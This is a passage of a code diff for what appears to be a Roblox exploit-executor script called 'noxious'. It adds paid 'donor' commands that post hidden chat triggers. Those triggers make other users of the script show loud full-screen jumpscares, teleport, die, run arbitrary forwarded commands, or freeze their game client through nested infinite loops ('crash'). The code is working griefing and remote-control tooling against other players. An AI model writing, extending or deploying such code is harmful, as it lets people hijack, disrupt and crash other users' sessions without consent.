+		screenGui.Parent = noxious["player gui"]
+
+		local videoFrame = Instance.new("VideoFrame")
+		videoFrame.Visible = false
+		videoFrame.Looped = false
+		videoFrame.Video = getcustomasset(noxious["stripperblot.webm"])
+		videoFrame.Volume = 1
+		videoFrame.BackgroundTransparency = 1
+		videoFrame.Size = UDim2.new(1, 0, 1, 60)
+		videoFrame.Position = UDim2.new(0, 0, 0, -60)
+		videoFrame.ZIndex = 6969
+		videoFrame.Parent = screenGui
+
+		while not videoFrame.IsLoaded do
+			task.wait()
+		end
+
+		videoFrame.Visible = true
+		videoFrame:Play()
+
+		videoFrame.Ended:Wait()
+		screenGui:Destroy()
+		videojumpscaring = false
+	end)
+end
+
+addcommand("scriptpalemachinejumpscare", "spmjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(palemachine)
+		channel:SendAsync"/e palemachinescare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function jobapplicationjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://97159344626718"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptjobapplicationjumpscare", "sjajs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(jobapplicationjumpscare)
+		channel:SendAsync"/e jobscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function conniejumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://122883746467598"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptconniejumpscare", "scjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(conniejumpscare)
+		channel:SendAsync"/e conniescare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function kendricklamarjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://99856131070481"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://74120482730232"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+	sound.TimePosition = 0.3
+
+	local sound2 = Instance.new("Sound")		
+	sound2.SoundId = "rbxassetid://7188420724"
+	sound2.Volume = 10
+	sound2.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+	task.spawn(function()
+		for i = 0, 1000 do
+			sound.Volume = sound.Volume - 0.08
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end)
+	sound2:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptkendricklamarjumpscare", "skljs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(kendricklamarjumpscare)
+		channel:SendAsync"/e mustard"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function toodlesjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://126828075913555"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scripttoodlesjumpscare", "stjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(toodlesjumpscare)
+		channel:SendAsync"/e eightballscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function buffpebblejumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://114310119148038"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptbuffpebblejumpscare", "sbpjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(buffpebblejumpscare)
+		channel:SendAsync"/e rockscare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function fruitcakejumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://129904337606298"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptfruitcakejumpscare", "sfcjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(fruitcakejumpscare)
+		channel:SendAsync"/e fruitcakescare"
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function sharingandandyjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://80342360027781"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptsharingandandyjumpscare", "ssdjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(sharingandandyjumpscare)
+		channel:SendAsync"/e menacingflowerscare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function jewelryboxjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://106865200462382"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptjewelryboxjumpscare", "sjbjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(jewelryboxjumpscare)
+		channel:SendAsync"/e jewelryboxscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function albertjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://14351044816"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptalbertjumpscare", "sajs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(albertjumpscare)
+		channel:SendAsync"/e albertscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function dandyjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://119960958639124"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptdandyjumpscare", "sdjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(dandyjumpscare)
+		channel:SendAsync"/e flowerscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function shellyjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://83275402274555"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptshellyjumpscare", "ssyjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(shellyjumpscare)
+		channel:SendAsync"/e shellscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function shrimpo2jumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://128772487557106"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptshrimpo2jumpscare", "sso2js", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(shrimpo2jumpscare)
+		channel:SendAsync"/e shrimpscare2"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function sproutjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://138852543835011"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptsproutjumpscare", "sstjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(sproutjumpscare)
+		channel:SendAsync"/e strawberryscare"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function shrimpojumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://97212326743600"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://7188420724"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptshrimpojumpscare", "ssojs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(shrimpojumpscare)
+		channel:SendAsync"/e shrimpscare"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function flashbang()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://12540062127"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://9069161602"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+	sound.Pitch = 1
+
+	local sound2 = Instance.new("Sound")		
+	sound2.SoundId = "rbxassetid://8754837104"
+	sound2.Volume = 2
+	sound2.Parent = noxious["player gui"]
+	sound2.TimePosition = 0.2
+	sound2.Pitch = 0.8
+
+	local sound3 = Instance.new("Sound")		
+	sound3.SoundId = "rbxassetid://9125402735"
+	sound3.Volume = 2
+	sound3.Parent = noxious["player gui"]
+	sound3.TimePosition = 0.2
+	sound3.Pitch = 0.8
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.002 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound2:Play()
+	sound3:Play()
+	task.wait(0.1)
+	sound:Play()
+
+	task.wait(0.5)
+
+	fadeOutImage()
+end
+
+addcommand("scriptflashbang", "sfb", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(flashbang)
+		channel:SendAsync"/e flashbang"	
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function scaryjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://10879079287"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://6600188325"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.025 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(1.8)
+
+	fadeOutImage()
+end
+
+addcommand("scriptscaryfacejumpscare", "ssfjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(scaryjumpscare)
+		channel:SendAsync"/e jumpscare"
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function lucyjumpscare()
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://94229574138300"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://1091083826"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+
+	local function fadeOutImage()
+		for i = 0, 1, 0.01 do
+			imageLabel.ImageTransparency = i
+			task.wait(0)
+		end
+		imageLabel:Destroy()
+	end
+
+	sound:Play()
+
+	task.wait(0)
+
+	fadeOutImage()
+end
+
+addcommand("scriptlucyjumpscare", "sljs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		task.spawn(lucyjumpscare)
+		channel:SendAsync"/e catscare"
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function ps4glitchjumpscare()
+	task.spawn(function()
+		while true do
+			for _, sound in ipairs(game:GetDescendants()) do
+				if sound:IsA("Sound") then
+					sound:Destroy()
+				end
+			end
+			task.wait()
+		end
+	end)
+
+	local screenGui = Instance.new("ScreenGui")		
+	screenGui.Parent = noxious["player gui"]
+
+	local blackout = Instance.new("Frame")		
+	blackout.Parent = screenGui
+	blackout.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	blackout.Visible = true
+	blackout.Size = UDim2.new(1, 0, 1, 60)
+	blackout.Position = UDim2.new(0, 0, 0, -60)
+	blackout.ZIndex = 6968
+
+	task.wait(3)
+
+	local imageLabel = Instance.new("ImageLabel")		
+	imageLabel.Parent = screenGui
+	imageLabel.Image = "rbxassetid://75974474881110"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.Visible = true
+	imageLabel.ImageTransparency = 0
+	imageLabel.Size = UDim2.new(1, 0, 1, 60)
+	imageLabel.Position = UDim2.new(0, 0, 0, -60)
+	imageLabel.ZIndex = 6969
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://5710016194"
+	sound.Volume = 10
+	sound.PlaybackSpeed = 0.3
+	sound.TimePosition = 0.1
+	sound.Parent = noxious["player gui"]
+
+	task.spawn(function()
+		task.wait(3)
+		sound.TimePosition = 1
+		task.delay(2, function()
+			sound:Destroy()
+			crash()
+		end)
+		while true do
+			sound:Play()
+			task.wait(0.2)
+		end
+	end)
+
+	sound:Play()
+end
+
+function ps4glitchjumpscareconfirmation()
+	popup(function(result)
+		if result == "yes" then
+			local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+			if channel then
+				task.spawn(ps4glitchjumpscare)
+				channel:SendAsync"/e dogscare"		
+			end
+		end
+	end, "Hey!", "This jumpscare may be discomforting for some audiences, Are you sure you want to run this?", "Yes.", "Nevermind.", true)
+end
+
+addcommand("scriptps4glitchjumpscare", "sps4gjs", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+	ps4glitchjumpscareconfirmation()
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptforcestopplayerinteractions", "sfspi", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e stopinteracting"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptnotify", "sn", function(...)
+	local text = table.concat({...}, " ")
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync("/e sn " .. text)
+		notify(text, 5)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptforceruncommand", "sfrc", function(...)
+	local text = table.concat({...}, " ")
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync("/e do " .. text)
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function teleportToPlayer(player)
+	local char = player.Character
+	if char and char:FindFirstChild("HumanoidRootPart") then
+		local localChar = noxious["character"]
+		if localChar and localChar:FindFirstChild("HumanoidRootPart") then
+			localChar.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+		end
+	end
+end
+
+addcommand("scriptteleport", "stp", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e tosender"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+addcommand("scriptkill", "skill", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e dies"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function crash()
+	while true do
+		while true do
+			while true do
+				while true do
+					while true do
+					end
+				end
+			end
+		end
+	end
+end
+
+addcommand("scriptcrash", "scrash", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
+
+	local channel = noxious["text chat service"].TextChannels:FindFirstChild("RBXGeneral")
+
+	if channel then
+		channel:SendAsync"/e crashes"		
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function creepygirlvoice()
+
+	local sound = Instance.new("Sound")		
+	sound.SoundId = "rbxassetid://6723965243"
+	sound.Volume = 10
+	sound.Parent = noxious["player gui"]
+	sound:Play()
+end
+
+addcommand("scriptcreepygirlvoice", "scgv", function()
+	if not donor(noxious["username"]) then
+		notify("You need to be a Donor in order to execute this command.", 5, "error")
+		return
+	end
+
